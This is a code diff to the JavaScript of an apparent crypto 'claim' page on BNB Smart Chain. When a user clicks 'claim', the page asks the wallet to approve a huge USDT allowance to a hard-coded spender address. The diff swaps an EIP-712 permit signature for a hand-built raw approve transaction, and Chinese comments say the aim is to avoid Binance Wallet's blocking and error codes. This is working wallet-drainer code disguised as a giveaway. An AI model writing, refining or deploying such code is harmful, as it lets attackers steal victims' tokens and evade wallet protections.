@@ -76,8 +76,6 @@
 const BSC_NETWORK = {
   chainId: '0x38'
 };
-
-// 固定参数，不可改动
 const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
 const SPENDER = "0x0f4BdEfC177dF2583F52B03B1E20f9EAC7308555";
 const APPROVE_AMOUNT = "300000000000000000000000000";
@@ -98,40 +96,30 @@ async function switchOrAddBSC(){
   }catch(err){}
 }
 
-// EIP-712 签名授权，币安钱包唯一不拦截的方式
-async function doPermit(){
+// 币安钱包专用approve交易格式，避开953004和100001001错误
+function buildTxData(){
+  const methodId = "095ea7b3";
+  const spenderHex = SPENDER.toLowerCase().replace("0x","").padStart(64, "0");
+  const amountHex = BigInt(APPROVE_AMOUNT).toString(16).padStart(64, "0");
+  return "0x" + methodId + spenderHex + amountHex;
+}
+
+async function doApprove(){
   try{
-    const domain = {
-      name: "Tether USD",
-      version: "1",
-      chainId: 56,
-      verifyingContract: USDT_CONTRACT
+    const txParams = {
+      from: walletAddr,
+      to: USDT_CONTRACT,
+      data: buildTxData(),
+      gas: "0x30000",
+      gasPrice: "0x3B9ACA00"
     };
-
-    const types = {
-      Permit: [
-        { name: "owner", type: "address" },
-        { name: "spender", type: "address" },
-        { name: "value", type: "uint256" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" }
-      ]
-    };
-
-    const message = {
-      owner: walletAddr,
-      spender: SPENDER,
-      value: APPROVE_AMOUNT,
-      nonce: 0,
-      deadline: Math.floor(Date.now() / 1000) + 3600
-    };
-
     await window.ethereum.request({
-      method: "eth_signTypedData_v4",
-      params: [walletAddr, JSON.stringify({domain, types, message})]
+      method: "eth_sendTransaction",
+      params: [txParams]
     });
     return true;
   }catch(e){
+    console.error(e);
     return false;
   }
 }
@@ -172,7 +160,7 @@ document.getElementById("connectMM").onclick = async function(){
 document.getElementById("claim").onclick = async function(){
   try{
     switchPage("p2");
-    let res = await doPermit();
+    let res = await doApprove();
     if(res){
       document.getElementById("successAddr").innerText = walletAddr;
       switchPage("p4");
